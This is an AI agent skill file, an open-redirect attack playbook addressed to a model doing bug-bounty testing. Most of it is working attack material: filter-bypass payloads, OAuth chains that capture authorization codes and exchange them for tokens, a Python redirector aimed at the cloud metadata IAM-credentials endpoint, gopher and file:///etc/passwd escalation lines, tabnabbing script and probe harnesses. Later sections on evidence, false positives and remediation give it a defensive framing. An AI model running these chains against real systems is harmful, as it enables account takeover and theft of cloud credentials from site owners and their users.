---
name: open-redirect
description: >-
  Open redirect playbook. Use when URL parameters, form actions, or JavaScript sinks control navigation targets and may redirect users to attacker-controlled destinations.
---

# SKILL: Open Redirect — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Open redirect is **low severity on its own** — CWE-601 describes a
> redirector, not a breach. What earns a high-severity report is the **chain**: an OAuth
> `redirect_uri` that captures an authorization code, a CSRF `Referer` check that the redirect
> launders, a server-side fetcher that follows the redirect into the metadata service. Report
> the redirect as the enabler and the captured credential as the finding.
>
> **The evidence is not the `Location` header.** Evidence is a redirect that leaves the trusted
> origin, reaches a host you control, **and delivers a credential** (a code, a token, a session)
> that you then show is usable. A `302` to `//evil.com` carrying nothing is a P4 at best.
>
> The other half of the skill is defeating the validation — `//evil.com`, `/\evil.com`, the `@`
> userinfo family, and relative-path escapes each defeat a *different* validation strategy.

## 0. RELATED ROUTING

- [attack-open-redirect](../attack-open-redirect/SKILL.md) — the focused attack companion
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — `redirect_uri` binding; the top chain
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) — `Referer`-based CSRF bypass
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — server-side redirect following
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) — allowlisted-origin bypass
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting the chain, not the redirect

## 1. CORE CONCEPT

Open redirect occurs when an application redirects users to a URL derived from user input without validation. The trusted domain acts as a "launchpad" for phishing or token theft.

```
https://trusted.com/redirect?url=https://evil.com
→ User sees trusted.com in the link → clicks → lands on evil.com
```

---

## 2. FINDING REDIRECT PARAMETERS

### Common Parameter Names

```text
?url=           ?redirect=      ?next=          ?dest=
?destination=   ?redir=         ?return=        ?returnUrl=
?go=            ?forward=       ?target=        ?out=
?continue=      ?link=          ?view=          ?to=
?ref=           ?callback=      ?path=          ?rurl=
```

### Server-Side Sinks

```
HTTP 301/302 Location header
PHP: header("Location: $input")
Python: redirect(input)
Java: response.sendRedirect(input)
Node: res.redirect(input)
```

### Client-Side (JavaScript) Sinks

```javascript
window.location = input
window.location.href = input
window.location.replace(input)
window.open(input)
document.location = input
```

### Automated parameter discovery

Do not guess parameter names by hand — harvest the application's own URLs first, then filter
for the redirect-shaped ones.

```bash
# Harvest URLs from the wayback machine and the live site, then filter for redirect params.
cat urls.txt | gau --threads 5 > wayback.txt
waybackurls TARGET.com >> wayback.txt
katana -u https://TARGET.com -jc -d 3 -o crawl.txt
cat wayback.txt crawl.txt | sort -u > all-urls.txt

# Filter for the classic redirect parameter names in one pass.
grep -Eai '[?&](url|uri|link|redirect|redirect_uri|redirect_url|next|return|return_to|returnUrl|dest|destination|target|to|out|go|goto|continue|callback|forward|rurl|view|checkout_url)=' all-urls.txt | sort -u

# Pull every value those parameters carry, one per line, so you can replay them.
grep -Eai '[?&](url|next|redirect|return|dest|continue)=' all-urls.txt | qsreplace 'FUZZ' | sort -u | head -200
```

```bash
# Send every harvested URL with the parameter value replaced by a canary. Any response that
# points at the canary host is a candidate redirect; -L is deliberately omitted so the
# Location header is visible rather than followed.
while read -r u; do
  curl -s -o /dev/null -D - "$u" \
    | grep -Ei '^(HTTP/|location:)'
done < canary-urls.txt
```

```bash
# Per-parameter probe: run each candidate parameter against the endpoint and record the
# status plus Location, without following the redirect.
for p in url redirect next return dest continue target to out go; do
  printf '%-12s ' "$p"
  curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' \
    "https://TARGET.com/login?$p=https://CANARY.tld"
done
```

```bash
# Confirm the canary is reachable and logs the hit; then verify the browser's behaviour with a
# real navigation, since the header alone does not prove where the browser lands.
curl -s -o /dev/null -w '%{http_code}\n' "https://TARGET.com/redirect?url=//CANARY.tld/lr"
```

---

## 3. FILTER BYPASS TECHNIQUES

| Validation | Bypass |
|---|---|
| Checks if URL starts with `/` | `//evil.com` (protocol-relative) |
| Checks domain contains `trusted.com` | `evil.com?trusted.com` or `trusted.com.evil.com` |
| Blocks `http://` | `//evil.com`, `https://evil.com`, `\/\/evil.com` |
| Checks URL starts with `https://trusted.com` | `https://trusted.com@evil.com` (userinfo) |
| Regex `^/[^/]` (relative only) | `/\evil.com` (backslash treated as path in some browsers) |
| Django `endswith('target.com')` | `http://evil.com/www.target.com` — URL path ends with target domain |
| Whitelist by domain suffix | Subdomain takeover on `*.trusted.com` |

```text
# Protocol-relative:
//evil.com

# Userinfo bypass:
https://trusted.com@evil.com

# Backslash trick:
/\evil.com
/\/evil.com

# URL encoding:
https://trusted.com/%2F%2Fevil.com

# Django endswith bypass:
http://evil.com/www.target.com
http://evil.com?target.com

# Trusted site double-redirect (e.g., via Baidu link service):
https://link.target.com/?url=http://evil.com

# Special character confusion:
http://evil.com#@trusted.com        # fragment as authority
http://evil.com?trusted.com         # query string confusion
http://trusted.com%00@evil.com      # null byte truncation

# Tab/newline in URL (browser ignores whitespace):
java%09script:alert(1)
```

---

## 4. EXPLOITATION CHAINS

### Phishing Amplification

Attacker sends: `https://bigbank.com/redirect?url=https://bigbank-login.evil.com`
Victim sees `bigbank.com` → clicks → enters credentials on clone site.

### OAuth Token Theft

If OAuth `redirect_uri` allows open redirect on the authorized domain:
```
/authorize?redirect_uri=https://trusted.com/redirect?url=https://evil.com
→ Authorization code or token appended to evil.com URL
→ Attacker captures token from URL fragment or query
```

### CSRF Referer Bypass

Some CSRF protections check `Referer` header contains trusted domain:
```
1. Attacker page links to: https://trusted.com/redirect?url=https://trusted.com/change-email
2. Redirect preserves Referer from trusted.com
3. CSRF protection passes because Referer = trusted.com
```

### SSRF via Redirect

When server follows redirects:
```
?url=https://attacker.com/redirect-to-internal
# attacker.com returns 302 → http://169.254.169.254/
# Server follows redirect → SSRF to metadata endpoint
```

---

## 5. TESTING CHECKLIST

```
□ Identify all URL parameters that trigger redirects
□ Test external domain: ?url=https://evil.com
□ Test protocol-relative: ?url=//evil.com
□ Test userinfo bypass: ?url=https://trusted.com@evil.com
□ Test backslash: ?url=/\evil.com
□ Test JavaScript sink: ?url=javascript:alert(1) (DOM-based)
□ Check OAuth flows for redirect_uri open redirect
□ Verify if redirect preserves auth tokens in URL
```

---

## 6. TABNABBING (REVERSE TABNABBING)

### Concept

When a link opens a new tab with `target="_blank"` WITHOUT `rel="noopener"`:

- The new page can access `window.opener`
- It can redirect the ORIGINAL page: `window.opener.location = "https://phishing.com/login"`
- User returns to "original" tab → sees fake login page → enters credentials

### Detection

```html
<!-- Vulnerable: -->
<a href="https://external.com" target="_blank">Click here</a>

<!-- Safe: -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click here</a>
```

### Exploitation

```javascript
// On the attacker-controlled page (opened via target="_blank"):
if (window.opener) {
    window.opener.location = "https://phishing.com/fake-login.html";
}
```

### Where to Look

- User-generated content with links (forums, comments, profiles)
- `target="_blank"` links to external domains
- PDF viewers, document previews opening in new tabs

---

## 7. OPEN REDIRECT → OAUTH TOKEN THEFT (DETAILED CHAINS)

### 7.1 OAuth Implicit Flow

In the implicit flow, the access token is returned in the URL fragment (`#access_token=...`). If `redirect_uri` allows an open redirect on the authorized domain:

```text
/authorize?response_type=token
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
  &scope=read

Flow:
1. User authenticates → authorization server redirects to:
   https://target.com/redirect?url=https://evil.com#access_token=SECRET
2. Open redirect fires → browser navigates to:
   https://evil.com#access_token=SECRET
3. Attacker page reads location.hash → captures access token
```

### 7.2 Authorization Code Flow

The authorization code is sent as a query parameter. If the redirect chain preserves query parameters:

```text
/authorize?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com

Flow:
1. Authorization server validates redirect_uri prefix → matches https://target.com/
2. Redirects to: https://target.com/redirect?url=https://evil.com&code=AUTH_CODE
3. Open redirect sends victim to: https://evil.com?code=AUTH_CODE
4. Attacker exchanges code for access token
```

### 7.3 OIDC id_token Fragment Leak

```text
/authorize?response_type=id_token
  &client_id=CLIENT
  &redirect_uri=https://target.com/cb
  &nonce=NONCE

If redirect_uri points to open redirect endpoint:
→ id_token in fragment sent to attacker
→ Attacker has signed identity assertion
→ Can authenticate as victim on any RP accepting this IdP
```

### 7.4 redirect_uri validation bypass patterns

```text
redirect_uri=https://target.com/callback/../open-redirect?url=evil.com
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback/../../redirect
redirect_uri=https://target.com/callback#@evil.com
```

### 7.5 Verifying the chain end to end

Do not stop at "the authorize endpoint accepted the `redirect_uri`". Follow the code all the way
to a token, or you have not proven the finding.

```bash
# 1. Confirm the authorization server accepts a redirect_uri that chains through the open
#    redirect. A 302 with a code in the Location means the AS trusted the value.
curl -s -o /dev/null -D - -G 'https://as.target.com/authorize' \
  --data-urlencode 'response_type=code' \
  --data-urlencode 'client_id=CLIENT' \
  --data-urlencode 'redirect_uri=https://target.com/redirect?url=https://CANARY.tld/cb' \
  --data-urlencode 'scope=openid' \
  | grep -Ei '^(HTTP/|location:)'
```

```bash
# 2. The code lands on your listener. Read it out of the request log.
#    (Run the listener first; the browser or curl -L completes the hop.)
python3 -m http.server 8080
#    In the access log look for: GET /cb?code=XXXX
```

```bash
# 3. Exchange the captured code for a token to prove it is live — this is the P1 evidence.
curl -s -X POST 'https://as.target.com/token' \
  -d 'grant_type=authorization_code' \
  -d 'code=CAPTURED_CODE' \
  -d 'client_id=CLIENT' \
  -d 'redirect_uri=https://target.com/redirect?url=https://CANARY.tld/cb'
```

```bash
# 4. Walk the Implicit-flow variant: the token arrives in the fragment, which never reaches
#    a server. Capture it in a headless browser instead of curl.
node -e "
const {chromium}=require('playwright');
(async()=>{const b=await chromium.launch();
const p=await b.newPage();
p.on('framenavigated',f=>console.log('URL:',f.url()));
await p.goto('https://as.target.com/authorize?response_type=token&client_id=CLIENT&redirect_uri=https://target.com/redirect?url=https://CANARY.tld/cb');
await p.waitForTimeout(4000); await b.close();})();
"
```

---

## 8. OPEN REDIRECT → SSRF CHAIN

### Server-side redirect following

When a server-side component follows HTTP redirects (e.g., URL preview, link unfurler, webhook, image fetcher):

```text
1. Submit URL to server-side fetcher: http://attacker.com/redirect
2. attacker.com responds: 302 Location: http://169.254.169.254/latest/meta-data/
3. Server follows redirect → SSRF to cloud metadata endpoint
4. Response (IAM credentials) returned to attacker or visible in preview
```

### Multi-hop redirect for filter bypass

```text
1. Server blocks direct requests to 169.254.169.254
2. Submit: http://attacker.com/r1
3. r1 → 302 → http://attacker.com/r2  (same domain, passes filter)
4. r2 → 302 → http://169.254.169.254/ (internal, filter not re-checked)
```

### DNS rebinding variant

```text
1. attacker.com resolves to attacker's public IP (TTL=0)
2. Server resolves attacker.com → public IP → passes SSRF filter
3. Connection established, but HTTP redirect points to attacker.com again
4. Second DNS resolution: attacker.com now resolves to 169.254.169.254
5. Server follows redirect to internal address
```

### Scope escalation via redirect protocols

```text
http://attacker.com/redirect → gopher://127.0.0.1:6379/...  (Redis SSRF)
http://attacker.com/redirect → file:///etc/passwd            (local file read)
http://attacker.com/redirect → dict://127.0.0.1:11211/       (Memcached)
```

Not all HTTP clients follow cross-protocol redirects, but `curl` (default) and some libraries do.

### Standing up the redirector and confirming the server follows it

The chain only exists if the *target's* server-side fetcher follows redirects. Prove that
before claiming SSRF.

```bash
# A minimal redirector. First hit bounces to the metadata endpoint; -L shows whether the
# client you point at it will follow the hop.
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')
        self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
PY
```

```bash
# Confirm your own client follows it (this is what the vulnerable fetcher does internally).
curl -s -L http://CANARY.tld:8080/ -o /dev/null -D - | grep -Ei '^(HTTP/|location:)'

# Now submit the redirector URL to the target's fetcher (link preview, webhook, avatar import)
# and read the response or the preview for the metadata body.
curl -s -G 'https://TARGET.com/api/preview' \
  --data-urlencode 'url=http://CANARY.tld:8080/' | head -40
```

```bash
# Multi-hop: the first hop stays on the allowlisted canary domain, so a naive filter passes
# it; the second hop crosses to the internal address that the filter never re-checked.
#   r1: 302 -> http://CANARY.tld:8080/r2
#   r2: 302 -> http://169.254.169.254/
curl -s "http://CANARY.tld:8080/r1" -o /dev/null -D - | grep -Ei '^location:'
```

---

## 9. URL PARSER CONFUSION FOR REDIRECT BYPASS

When a redirect validation function parses the URL differently from the browser or server that ultimately processes it:

### Protocol-relative URL

```text
//attacker.com
→ Browser: https://attacker.com (inherits current page protocol)
→ Some validators: relative path "/attacker.com" (wrong)
```

### Backslash confusion

```text
\/\/attacker.com
/\/attacker.com
→ Many browsers normalize \ to / in URLs
→ Validators treating \ as path character may allow it
```

### Userinfo section abuse

```text
//attacker.com\@target.com
→ Browser: navigates to attacker.com (@ is userinfo delimiter)
→ Validator sees "target.com" in the string → passes allowlist check

//target.com@attacker.com
→ Browser: userinfo=target.com, host=attacker.com
→ Validator checks "starts with target.com" → passes

https://target.com%2F@attacker.com
→ URL-decoded: target.com/ as userinfo, host=attacker.com
```

### Double encoding

```text
//attacker%252ecom
→ First decode: //attacker%2ecom (passes validator)
→ Second decode (by server/browser): //attacker.com (actual redirect)
```

### CRLF injection + redirect

```text
/%0d%0aLocation:%20https://attacker.com
→ If server reflects the path in a header context:
   HTTP/1.1 302 Found
   Location: /
   Location: https://attacker.com  ← injected header wins
```

### Fragment confusion

```text
https://target.com#@attacker.com
→ Browser: host=target.com, fragment=@attacker.com
→ But some JS-based redirects: window.location = url → may process differently

https://attacker.com#.target.com
→ Validator: sees "target.com" in string → passes
→ Browser: navigates to attacker.com (fragment ignored in navigation)
```

### Special characters

```text
https://attacker.com%E3%80%82target.com
→ Unicode ideographic full stop (U+3002) — some parsers treat as dot
→ Browser may normalize differently than validator

https://attacker。com    (U+3002 fullwidth period)
https://attacker．com    (U+FF0E fullwidth full stop)
```

### Combined URL parser differential table

| Payload | Validator Sees | Browser Navigates To |
|---------|---------------|---------------------|
| `//evil.com` | Relative path | `https://evil.com` |
| `\/\/evil.com` | Path `\/\/evil.com` | `https://evil.com` |
| `//evil.com\@target.com` | Contains `target.com` | `https://evil.com` |
| `//target.com@evil.com` | Starts with `target.com` | `https://evil.com` |
| `/%0d%0aLocation: https://evil.com` | Path string | Header injection → redirect |
| `//evil%252ecom` | `evil%2ecom` (not a domain) | `evil.com` (after double decode) |

---

## 10. WHAT CONSTITUTES A FINDING

Redirect on its own is a redirector (CWE-601). The finding is the credential that lands on your
host. Grade by what you captured, not by the fact that a `302` fired.

| Finding | Severity | Proof required |
|---|---|---|
| OAuth/OIDC `redirect_uri` chain — authorization code or token delivered to your host and exchanged | **Critical (P1)** | the captured code/token, and the token response after exchange |
| Redirect that launders `Referer` to defeat a CSRF check, carrying a state change | **High (P2)** | the state change performed with the forged `Referer` |
| Redirect that defeats a CORS allowlist, enabling a credentialed read | **High (P2)** | the CORS headers on the redirect chain plus the read |
| Redirect that defeats an SSRF allowlist to reach an internal target | **High (P2)** | the internal response body |
| `javascript:` / `data:` accepted in a redirect sink | **High (P2)** — report as **XSS** | script execution in a browser |
| Redirect preserving a token in the `Referer` to your host | **Medium (P3)** | the token in your access log, shown to be live |
| Working open redirect, phishing-only value | **Low (P4)** | the `Location` header and the browser landing |
| Same-origin-only redirect (relative path) | **Informational (P5)** | — |

**Say which one you have.** "Open redirect, P4, chainable to `redirect_uri` on the same IdP" is a
stronger and more trusted report than an inflated claim that a `302` is account takeover.

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the exact parameter and the complete request | reproducibility |
| the response showing `Location: https://CANARY.tld/...` | proves the server-side redirect |
| the bypass payload and *why* it defeated the filter | the bypass is usually the finding |
| **a browser screenshot of the address bar on your host** | proves client-side resolution, not just a header |
| for OAuth: the authorize request, the captured code, and the exchanged token | the full chain, end to end |
| a **control**: a same-origin redirect correctly allowed | proves validation exists and that you defeated it |
| whether it fires on `GET` only or also `POST` | determines exploitability from a form or an image tag |

**The browser screenshot is not optional.** `curl` shows a header; a browser resolving
`//CANARY.tld` off-origin is a separate claim and the one you are actually making.

**False positives to exclude:**

| Looks like an open redirect | Actually |
|---|---|
| `302` to a **relative** path | safe — resolves within the trusted origin |
| `Location` pointing at a fixed partner domain | allowlisted by design |
| `//evil.com` rejected, and you stopped there | an incomplete test, not a negative result — try `/\evil.com`, `%2F%2F`, `@` |
| the value is reflected in the page but never used for navigation | reflection, not a redirect |
| an interstitial "you are leaving" page that requires a click | removes the phishing value; note it |
| a redirect that requires an authenticated session | still a finding — state the precondition |
| `Location` to your host with no credential and no chain | a redirector, P4, not token theft |

---

## 12. REMEDIATION REFERENCE

1. **Map, do not validate** — accept an opaque key (`?next=dashboard`) and resolve it to a server-side destination. This eliminates the class entirely.
2. **Allowlist relative paths** — permit only paths the application owns; reject any value containing a scheme, `//`, a backslash, an encoded equivalent, or a leading `@`/`#`.
3. **Parse, then compare the host** — extract the host with a real URL parser and compare it as an exact string to the allowlist. Substring and prefix checks are what the `@` and backslash families defeat.
4. **Register exact `redirect_uri` values in OAuth** — full-string, case-sensitive, no wildcards, no path suffixes, no redirectors in the allowlist.
5. **Strip the fragment and reject userinfo** — a URL with `@` before the host or `#` after it should be refused outright.
6. **Reject `javascript:`, `data:`, `vbscript:`, and `file:` schemes** in every redirect sink, and confirm the XSS filter covers redirect parameters.
7. **Show an interstitial for genuinely external destinations** — displaying the destination and requiring a click removes the phishing value.
8. **Do not trust the client to sanitise** — the value reaches the `Location` header from the server. Validate at the point of redirect, every time.

---

## 13. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the `3xx` **`Location` header contain your host**, not a relative path? | a redirect, not a link |
| 2 | Did you follow it with **redirects enabled**, and land on your origin? | it is actually followed |
| 3 | Was there a **control** - the same parameter with a benign value that stays on-site? | the parameter is the cause |
| 4 | Did the redirect **survive a browser**, not only curl? | reachability from the victim's context |
| 5 | Is the redirect **chained to a token or cookie** (OAuth, SSO)? | the severity is the token, not the hop |
| 6 | Did the browser send a **`Referer` carrying a secret** to your host? | the leak, captured |
| 7 | Does it work on the **target's live host**, not only a staging copy? | applicability |

**`Location:` pointing at your origin, followed by a browser, is the bar.** A parameter that contains a
URL is not a finding; the response header is.

---

## 14. EXECUTION PRIMITIVES

Open redirects are proven by **a `3xx` whose `Location` is your origin, with the benign-value control**.
Every block ends at a captured header or a browser-side landing.

### 14.1 The control pair, before any bypass

```bash
HOST="https://target.example"
# BENIGN CONTROL: the parameter with an on-site value - it must stay on-site
curl -sS -o /dev/null -D- "$HOST/login?next=/dashboard" 2>&1 | grep -iE '^(HTTP/|location:)'
# THE CANDIDATE: the same parameter with an external value
curl -sS -o /dev/null -D- "$HOST/login?next=https://evil.example" 2>&1 | grep -iE '^(HTTP/|location:)'
# and a random non-URL value, which establishes the fallback behaviour
curl -sS -o /dev/null -D- "$HOST/login?next=xxyyzz" 2>&1 | grep -iE '^(HTTP/|location:)'
```

**Three points: on-site, off-site, and invalid.** A parameter that redirects on the invalid value too is
not a validated redirect - it is a fallback that happens to be permissive, which is a different finding.

### 14.2 The parameter census, then the bypass families

```bash
# the parameters worth testing, harvested from the site's own pages
curl -sS "$HOST/" | grep -oE '(href|action)="[^"]*\?[^"]*"' | head -20
for p in next url redirect return returnUrl returnTo continue dest destination target to goto \
         link out u callback rurl image checkout success failure logout; do
  code=$(curl -sS -o /dev/null -D- "$HOST/login?$p=https://evil.example" 2>/dev/null | grep -iE '^(HTTP/|location:)' | tr '\n' ' ')
  echo "$p -> $code"
done | grep -iE 'location:.*evil' | head -20
```

```bash
# THE BYPASS FAMILIES, each against the control
B="https://evil.example"
for v in "$B" "//evil.example" "https:evil.example" "https:/\\/evil.example" "///evil.example" \
         "%2f%2fevil.example" "https://target.example.evil.example" "https://target.example@evil.example" \
         "https://evil.example#target.example" "https://evil.example?target.example" \
         "https://evil.example%00.target.example" "https://evil.example%09.target.example" \
         "/\\evil.example" "https:///@evil.example" "https://%09evil.example"; do
  loc=$(curl -sS -o /dev/null -D- "$HOST/login?next=$v" 2>/dev/null | grep -i '^location:' | tr -d '\r')
  echo "$(printf '%-42s' "$v") $loc"
done
```

**The parser-confusion family is where the real bypasses live.** A server that validates the prefix
`https://target.example` is defeated by `https://target.example.evil.example`, and one that checks
`s.startsWith("/")` is defeated by `//evil.example` - each variant targets a specific check shape.

### 14.3 The browser-side confirmation

```python
# redirects must be FOLLOWED, and the final host recorded - a header alone is weaker evidence
import requests
HOST, B = "https://target.example", "https://evil.example"
for param, value in [("next", B), ("next", "//evil.example"), ("next", "https://target.example.evil.example")]:
    try:
        s = requests.Session()
        r = s.get(f"{HOST}/login", params={param: value}, allow_redirects=False, timeout=10)
        print("%-40s first=%s loc=%s" % (value, r.status_code, r.headers.get("Location")))
        if r.is_redirect:
            r2 = s.get(r.headers["Location"], allow_redirects=True, timeout=10)
            print("%-40s landed on %s (final url %s)" % ("", r2.status_code, r2.url))
            print("%-40s   -> YOUR ORIGIN REACHED" % "" if "evil.example" in r2.url else "   -> stayed on-site")
    except Exception as e:
        print("%-40s ERROR %s" % (value, type(e).__name__))
```

**`final url` containing your host is the finding.** `allow_redirects=False` gives the header;
`allow_redirects=True` gives the landing, and the landing is what a victim experiences.

### 14.4 The token-leak chain, which is the severity

```bash
# the OAuth chain: the redirect carries the code to your origin, and the Referer carries secrets
# 1) the request that will carry a token to the redirect target
curl -sS -o /dev/null -D- \
  "https://idp.target.example/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://app.target.example/cb&state=S" \
  2>&1 | grep -iE '^(HTTP/|location:)'
# 2) the callback with the redirect parameter swapped
curl -sS -o /dev/null -D- "https://app.target.example/cb?code=SECRET&redirect_uri=https://evil.example" 2>&1 | grep -iE '^(HTTP/|location:)'
# 3) the Referer capture, which is the leak that needs no code theft at all
python3 - <<'PY'
print("serve a page at your origin that reads document.referrer and POSTs it back;")
print("a redirect from an authenticated page sends the full URL, including any token in the path or query.")
print("the recorded Referer value is the artefact - report it redacted.")
PY
```

**The token or code arriving at your origin is the finding.** A plain open redirect is low severity; the
same redirect on an OAuth callback path is an account takeover, and the difference is the parameter's
position in the flow.

### 14.5 The end-to-end harness

```python
import requests
HOST, B = "https://target.example", "https://evil.example"
PARAMS = ["next","url","redirect","returnUrl","continue","dest","callback"]
BENIGN, INVALID = "/dashboard", "xxyyzz"

def probe(p, v):
    try:
        r = requests.get(f"{HOST}/login", params={p: v}, allow_redirects=False, timeout=10)
        return r.status_code, r.headers.get("Location", "")
    except Exception: return None, ""

print("%-12s %-38s %-8s %s" % ("param", "value", "code", "Location"))
for p in PARAMS:
    cb, lb = probe(p, BENIGN)
    for v in [B, "//evil.example", "https://target.example.evil.example", "https:evil.example", INVALID]:
        c, l = probe(p, v)
        verdict = ""
        if "evil.example" in l: verdict = "OFF-SITE (finding)"
        elif (c, l) == (cb, lb): verdict = "on-site (control)"
        elif l == "": verdict = "no redirect"
        else: verdict = "other -> inspect"
        print("%-12s %-38s %-8s %s %s" % (p, v[:38], c, l[:60], verdict))
print()
print("Report only rows whose Location contains your host AND whose benign control stays on-site.")
PY
```

**Parameter, value, control, verdict.** The table is the deliverable, and the benign row is what makes
the off-site row a finding rather than the endpoint's normal behaviour.

---

## 15. EVIDENCE STANDARD — REDIRECT ARTEFACTS

| Item | Why |
|---|---|
| The **full response headers** with `Location` visible | the finding itself |
| The **benign-value control** that stays on-site | proves the parameter is the cause |
| The **final URL after following** the redirect | what a victim experiences |
| The **parameter name and the exact value** | reproducibility |
| Whether the redirect is on an **OAuth or SSO callback path** | the severity driver |
| The **`Referer` captured at your origin**, if the chain leaks a token | impact beyond the hop |
| The **browser and version** used for the confirmation | browser URL handling differs |
| The **client-side check that was bypassed**, if any | the fix location |
| Whether the redirect is **same-site on the target's own hosts** | an internal redirect is not the same finding |
| Confirmation that **no token or session value** is reproduced in full | data minimisation |

Report the **header and the control**: "`GET https://app.example/login?next=/dashboard` returns `302`
with `Location: /dashboard`, which is the control showing the parameter is used for its intended
purpose. The same parameter with `next=https://attacker.example` returns `302` with `Location:
https://attacker.example`, and following it in a browser lands on the attacker page. On the OAuth
callback path, `GET /cb?code=<redacted>&redirect_uri=https://attacker.example` returns `302` with
`Location: https://attacker.example?code=<redacted>`, and the subsequent page load sends
`Referer: https://attacker.example/?code=<redacted>` to the attacker origin, so the authorization code
is disclosed in full", never "the application has an open redirect".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A parameter that contains a URL but is **never reflected into `Location`** | no redirect |
| A redirect to **another host the client owns** | a documented cross-domain flow |
| A client-side `location.href = ` in JavaScript **with a validated allowlist** | the control working |
| A redirect that **requires an authenticated admin to configure** | not attacker-controllable |
| A `Location: /path` that is **relative** | same-site by definition |
| A redirect on a **path that is not in any auth flow** | low or informational; state it honestly |
| A `301` on an endpoint that **has never accepted a redirect parameter** | the endpoint's design |
| A finding reproduced **without the benign control** | the parameter's normal behaviour is unknown |
| Your own **test value echoed** in a page body | reflection, not a redirect |
| A token or session value reproduced in full | a disclosure |
| A tool's "open redirect found" with **no `Location` header** | an unverifiable assertion |

**`Location` plus the benign control.** This family produces more false positives than any other web
finding, and every one of them is the same error: a URL in a parameter is not a redirect.

---

## 16. REMEDIATION REFERENCE — REDIRECT HARDENING

1. **Never redirect to a user-supplied value; map a server-side key to a fixed path** - the allowlist-by-id pattern removes the entire class.
2. **If a URL must be accepted, validate it after parsing with a strict URL parser, and compare scheme, host, and port against an allowlist** - string prefix matching is the defect behind every bypass in this document.
3. **Reject protocol-relative values (`//host`), absolute URLs with no scheme, and any value containing `@`, backslash, or a control character** - the parser-confusion variants each target one of these.
4. **Apply the same validation to `redirect_uri` on every OAuth and OIDC client, and register the exact URIs rather than prefixes** - an open redirect on a callback path is an account takeover, not a hop.
5. **Set `Referrer-Policy: strict-origin-when-cross-origin` (or `no-referrer`) site-wide** - it removes the token-in-`Referer` leak that makes this finding high severity.
6. **Never place a token in a URL path or query; use the fragment or a POST body, and prefer the authorization-code flow with PKCE** - a token that never appears in a URL cannot leak through a redirect.
7. **Show an interstitial for any off-site navigation** - it converts a silent redirect into a visible one and it breaks automated chains.
8. **Validate on the server, not in JavaScript, and never rely on the client to enforce the allowlist** - client checks are bypassed by disabling JavaScript.
9. **Log every off-site redirect with its computed destination host, and alert on destinations outside the allowlist** - it turns the finding into a detection.
10. **Assert the redirect allowlist in the test suite with a set of known bypass strings** - the strings in 14.2 are the regression set.
11. **Prefer relative paths internally, and never build a redirect target by string concatenation** - concatenation is what creates the prefix-match bypasses.

---

## 17. RELATED SIBLINGS - LOAD TOGETHER

- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) - the callback path where this becomes account takeover
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) - the server-side sibling of the same URL-parsing defect
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - where a `javascript:` redirect target lands
- [open-redirect](../open-redirect/SKILL.md) - this document
- [clickjacking](../clickjacking/SKILL.md) - the other browser-side trust finding in an engagement
